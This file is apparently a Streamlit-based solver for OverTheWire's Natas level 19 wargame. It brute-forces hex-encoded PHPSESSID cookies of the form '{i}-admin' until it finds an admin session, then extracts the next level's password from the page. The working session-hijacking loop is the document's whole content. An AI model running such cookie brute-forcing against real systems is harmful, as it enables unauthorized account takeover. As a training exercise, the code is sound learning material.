import streamlit as st
import re
import binascii

def run(context, session, base_url):
    st.info("Targeting Hex-Encoded Session Attributes via sequential value manipulation...")
    
    # 1. Establish baseline target credentials for Level 19
    username = "natas19"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Define search space for the session ID brute force
    max_session_ids = 640
    st.write(f"🔄 Commencing Hex-encoded space sweep (Range: 1 to {max_session_ids})...")
    
    progress_bar = st.progress(0)
    status_display = st.empty()
    
    # 2. Iterate through predictable session profiles
    for i in range(1, max_session_ids + 1):
        # Update UI feedback controls
        progress_bar.progress(i / max_session_ids)
        if i % 20 == 0 or i == 1:
            status_display.text(f"Testing session ID profile index: {i}")
            
        # Create the target string context following the [ID]-admin protocol
        admin_string = f"{i}-admin"
        
        # Convert the string to its Hexadecimal representation
        hex_cookie_val = binascii.hexlify(admin_string.encode('utf-8')).decode('utf-8')
            
        # Bind the encoded string to the session cookie manager
        session.cookies.set("PHPSESSID", hex_cookie_val, domain=".natas.labs.overthewire.org", path="/")
        
        try:
            # Transmit request to evaluate credentials state change
            response = session.get(base_url, timeout=5)
            
            # Look for the administrative flag presentation indicator
            if "You are an admin" in response.text:
                status_display.empty()
                st.success(f"🎯 Admin session matched successfully! Index: `{i}` | Hex Cookie: `{hex_cookie_val}`")
                
                # Extract all 32/64 character alphanumeric strings on the page
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
                
                # Filter out current active authentication credentials
                new_tokens = [t for t in all_tokens if t != current_password]
                
                if new_tokens:
                    st.success("🎯 Level 19 challenge resolved successfully!")
                    st.code(f"Natas 20 Password: {new_tokens[0]}")
                else:
                    st.warning("Admin access authorized, but token regex filtering returned empty arrays.")
                    with st.expander("Examine Page Content Payload"):
                        st.code(response.text, language="html")
                return
                
        except Exception as e:
            st.error(f"Connection error at loop index {i}: {str(e)}")
            return
            
    st.error("Sweep finished completely but no administrative privilege elevation indicators were logged.")